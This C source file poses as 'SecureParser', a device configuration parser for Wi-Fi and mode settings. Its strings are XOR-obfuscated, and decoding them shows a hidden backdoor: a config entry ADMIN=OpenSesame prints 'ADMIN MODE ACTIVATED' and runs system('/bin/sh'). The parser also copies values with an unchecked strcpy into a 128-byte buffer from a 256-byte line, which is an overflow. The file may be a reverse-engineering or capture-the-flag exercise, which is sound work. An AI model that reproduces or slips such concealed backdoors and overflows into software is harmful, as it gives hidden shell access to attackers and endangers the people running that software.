#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define L1 256
#define L2 64
#define L3 128

__attribute__((used,
               section(".rodata.copyright"))) static const char COPYRIGHT[] =
    "============================\n"
    "SecureParser 3.1.2 — (C) 2025 University of Birmingham — License: GPL\n"
    "If you would like the corresponding source code, you may request it\n"
    "under the terms of the GNU General Public License (GPL).\n"
    "To request the source, contact: secureparser@hegz.io\n"
    "============================\n";

const char *get_copyright_notice(void) { return COPYRIGHT; }

typedef struct {
  char a1[L3];
  char a2[L3];
  char a3[L3];
  char a4[L3];
  int b1;
  int b2;
} T1;

void f1(char *dst, const unsigned char *src, int len) {
  for (int i = 0; i < len; i++) {
    dst[i] = src[i] ^ 0x55;
  }
  dst[len] = '\0';
}

int f2(const char *s1, const unsigned char *s2, int len) {
  for (int i = 0; i < len; i++) {
    if (s1[i] != (s2[i] ^ 0x55)) {
      return 0;
    }
  }
  if (s1[len] != '\0')
    return 0;
  return 1;
}

void f3(T1 *t) {
  memset(t, 0, sizeof(T1));
  unsigned char x1[] = {0x3B, 0x3A, 0x27, 0x38, 0x34, 0x39};
  f1(t->a3, x1, 6);
  t->b1 = 0;
  t->b2 = 0;
}

void f4(T1 *t) {
  char buf[100];

  unsigned char s1[] = {0x68, 0x68, 0x68, 0x75, 0x16, 0x3A, 0x3B, 0x33,
                        0x3C, 0x32, 0x20, 0x27, 0x34, 0x21, 0x3C, 0x3A,
                        0x3B, 0x75, 0x68, 0x68, 0x68, 0x5F};
  f1(buf, s1, 22);
  printf("%s", buf);

  unsigned char s2[] = {0x02, 0x1C, 0x13, 0x1C, 0x0A, 0x06, 0x06,
                        0x1C, 0x11, 0x6F, 0x75, 0x70, 0x26, 0x5F};
  f1(buf, s2, 14);
  printf(buf, t->a1);

  unsigned char s3[] = {0x02, 0x1C, 0x13, 0x1C, 0x0A, 0x05, 0x14,
                        0x06, 0x06, 0x6F, 0x75, 0x70, 0x26, 0x5F};
  f1(buf, s3, 14);
  if (t->a2[0]) {
    unsigned char p1[] = {0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F};
    char pw[10];
    f1(pw, p1, 8);
    printf(buf, pw);
  } else {
    unsigned char p2[] = {0x7D, 0x3B, 0x3A, 0x21, 0x75, 0x26, 0x30, 0x21, 0x7C};
    char pw[15];
    f1(pw, p2, 9);
    printf(buf, pw);
  }

  unsigned char s4[] = {0x18, 0x1A, 0x11, 0x10, 0x6F, 0x75, 0x70, 0x26, 0x5F};
  f1(buf, s4, 9);
  printf(buf, t->a3);

  unsigned char s5[] = {0x11, 0x10, 0x03, 0x1C, 0x16, 0x10, 0x0A, 0x1B,
                        0x14, 0x18, 0x10, 0x6F, 0x75, 0x70, 0x26, 0x5F};
  f1(buf, s5, 16);
  printf(buf, t->a4);

  unsigned char s6[] = {0x11, 0x10, 0x17, 0x00, 0x12,
                        0x6F, 0x75, 0x70, 0x26, 0x5F};
  f1(buf, s6, 10);
  if (t->b1) {
    unsigned char e1[] = {0x30, 0x3B, 0x34, 0x37, 0x39, 0x30, 0x31};
    char en[10];
    f1(en, e1, 7);
    printf(buf, en);
  } else {
    unsigned char e2[] = {0x31, 0x3C, 0x26, 0x34, 0x37, 0x39, 0x30, 0x31};
    char en[10];
    f1(en, e2, 8);
    printf(buf, en);
  }

  if (t->b2) {
    unsigned char m1[] = {0x5F, 0x0E, 0x74, 0x08, 0x75, 0x14, 0x11, 0x18,
                          0x1C, 0x1B, 0x75, 0x18, 0x1A, 0x11, 0x10, 0x75,
                          0x14, 0x16, 0x01, 0x1C, 0x03, 0x14, 0x01, 0x10,
                          0x11, 0x75, 0x0E, 0x74, 0x08, 0x5F};
    char msg[50];
    f1(msg, m1, 30);
    printf("%s", msg);

    unsigned char m2[] = {0x10, 0x2D, 0x30, 0x36, 0x20, 0x21, 0x3C,
                          0x3B, 0x32, 0x75, 0x26, 0x3D, 0x30, 0x39,
                          0x39, 0x7B, 0x7B, 0x7B, 0x5F};
    f1(msg, m2, 19);
    printf("%s", msg);

    unsigned char sh[] = {0x7A, 0x37, 0x3C, 0x3B, 0x7A, 0x26, 0x3D};
    char cmd[10];
    f1(cmd, sh, 7);
    system(cmd);
  }
}

int f5(char *line, char *key, char *val) {
  char *eq = strchr(line, '=');
  if (!eq)
    return -1;

  int klen = eq - line;
  if (klen >= L2)
    return -1;

  strncpy(key, line, klen);
  key[klen] = '\0';

  strcpy(val, eq + 1);

  return 0;
}

void f6(T1 *t, char *key, char *val) {
  char tmp[50];

  unsigned char k1[] = {0x02, 0x1C, 0x13, 0x1C, 0x0A, 0x06, 0x06, 0x1C, 0x11};
  unsigned char k2[] = {0x02, 0x1C, 0x13, 0x1C, 0x0A, 0x05, 0x14, 0x06, 0x06};
  unsigned char k3[] = {0x18, 0x1A, 0x11, 0x10};
  unsigned char k4[] = {0x11, 0x10, 0x03, 0x1C, 0x16, 0x10,
                        0x0A, 0x1B, 0x14, 0x18, 0x10};
  unsigned char k5[] = {0x11, 0x10, 0x17, 0x00, 0x12};
  unsigned char k6[] = {0x14, 0x11, 0x18, 0x1C, 0x1B};
  unsigned char v1[] = {0x64};
  unsigned char v2[] = {0x21, 0x27, 0x20, 0x30};
  unsigned char v3[] = {0x1A, 0x25, 0x30, 0x3B, 0x06,
                        0x30, 0x26, 0x34, 0x38, 0x30};

  if (f2(key, k1, 9)) {
    strncpy(t->a1, val, L3 - 1);
    t->a1[L3 - 1] = '\0';
  } else if (f2(key, k2, 9)) {
    strncpy(t->a2, val, L3 - 1);
    t->a2[L3 - 1] = '\0';
  } else if (f2(key, k3, 4)) {
    strncpy(t->a3, val, L3 - 1);
    t->a3[L3 - 1] = '\0';
  } else if (f2(key, k4, 11)) {
    strncpy(t->a4, val, L3 - 1);
    t->a4[L3 - 1] = '\0';
  } else if (f2(key, k5, 5)) {
    f1(tmp, v1, 1);
    int c1 = strcmp(val, tmp);
    f1(tmp, v2, 4);
    int c2 = strcmp(val, tmp);
    t->b1 = (c1 == 0 || c2 == 0);
  } else if (f2(key, k6, 5)) {
    if (f2(val, v3, 10)) {
      t->b2 = 1;
    }
  }
}

int f7(const char *fname, T1 *t) {
  unsigned char mode[] = {0x27};
  char md[5];
  f1(md, mode, 1);

  FILE *fp = fopen(fname, md);
  if (!fp) {
    unsigned char err[] = {0x10, 0x27, 0x27, 0x3A, 0x27, 0x75,
                           0x3A, 0x25, 0x30, 0x3B, 0x3C, 0x3B,
                           0x32, 0x75, 0x33, 0x3C, 0x39, 0x30};
    char errmsg[30];
    f1(errmsg, err, 18);
    perror(errmsg);
    return -1;
  }

  char line[L1];
  char key[L2];
  char val[L3];

  while (fgets(line, sizeof(line), fp)) {
    line[strcspn(line, "\n")] = 0;
    line[strcspn(line, "\r")] = 0;

    if (line[0] == '\0' || line[0] == '#') {
      continue;
    }

    if (f5(line, key, val) == 0) {
      f6(t, key, val);
    }
  }

  fclose(fp);
  return 0;
}

int f8(T1 *t) {
  char line[L1];
  char key[L2];
  char val[L3];

  while (fgets(line, sizeof(line), stdin)) {
    line[strcspn(line, "\n")] = 0;
    line[strcspn(line, "\r")] = 0;

    if (line[0] == '\0' || line[0] == '#') {
      continue;
    }

    if (f5(line, key, val) == 0) {
      f6(t, key, val);
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  T1 t;
  f3(&t);

  if (argc > 1) {
    if (f7(argv[1], &t) != 0) {
      return 1;
    }
  } else {
    f8(&t);
  }

  f4(&t);

  return 0;
}
